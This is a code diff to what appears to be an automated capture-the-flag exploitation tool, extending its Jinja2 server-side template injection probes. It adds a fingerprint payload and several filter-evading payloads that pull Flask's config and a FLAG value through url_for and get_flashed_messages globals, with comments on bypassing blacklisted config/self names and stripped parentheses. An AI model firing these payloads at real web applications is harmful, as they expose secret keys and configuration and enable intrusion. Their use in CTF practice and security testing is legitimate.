@@ -418,8 +418,12 @@ class SSTIExecutorMixin:
                             },
                         )
                     break
-            # --- Jinja2 probe: {{config}} / context.config -----------------
-            for jinja_payload in ("{{config}}", "{{self._TemplateReference__context.config}}"):
+            # --- Jinja2 probe: {{7*'7'}} fingerprint / {{config}} dump ------
+            # {{7*'7'}} -> "7777777" is a paren-free, non-shadowed Jinja2
+            # fingerprint that survives challenges which blacklist ``config`` /
+            # ``self`` (e.g. shrine sets them to None), where {{config}} yields
+            # nothing useful.
+            for jinja_payload in ("{{7*'7'}}", "{{config}}", "{{self._TemplateReference__context.config}}"):
                 jinja_url = self._inject_render_payload(candidate, jinja_payload)
                 try:
                     resp = await self.runtime.proxy_action("get", url=jinja_url, timeout=10)
@@ -432,7 +436,9 @@ class SSTIExecutorMixin:
                 if not body:
                     continue
                 lowered = body.lower()
-                if any(marker in lowered for marker in ("secret_key", "jinja", "config", "flask")):
+                if "7777777" in body or any(
+                    marker in lowered for marker in ("secret_key", "jinja", "config", "flask")
+                ):
                     engine = "jinja2"
                     if self.state is not None:
                         self.state.add_observation(
@@ -582,8 +588,19 @@ class SSTIExecutorMixin:
             candidate_urls = self._collect_render_surface_urls(base, page_features)
             if not candidate_urls:
                 candidate_urls = [urljoin(base + "/", "error?msg=Error")]
+            # The globals-based payloads reach ``current_app.config`` through a
+            # builtin global (url_for / get_flashed_messages) rather than the
+            # bare ``config`` name, so they survive challenges that shadow
+            # ``config``/``self`` (shrine sets them to None). All are paren-free
+            # to also survive ``(`` / ``)`` stripping.
             for candidate in candidate_urls:
-                for jinja_payload in ["{{config}}", "{{self._TemplateReference__context.config}}"]:
+                for jinja_payload in [
+                    "{{config}}",
+                    "{{self._TemplateReference__context.config}}",
+                    "{{url_for.__globals__['current_app'].config}}",
+                    "{{get_flashed_messages.__globals__['current_app'].config}}",
+                    "{{url_for.__globals__['current_app'].config['FLAG']}}",
+                ]:
                     probe_url = self._inject_render_payload(candidate, jinja_payload)
                     try:
                         resp = await self.runtime.proxy_action("get", url=probe_url, timeout=10)
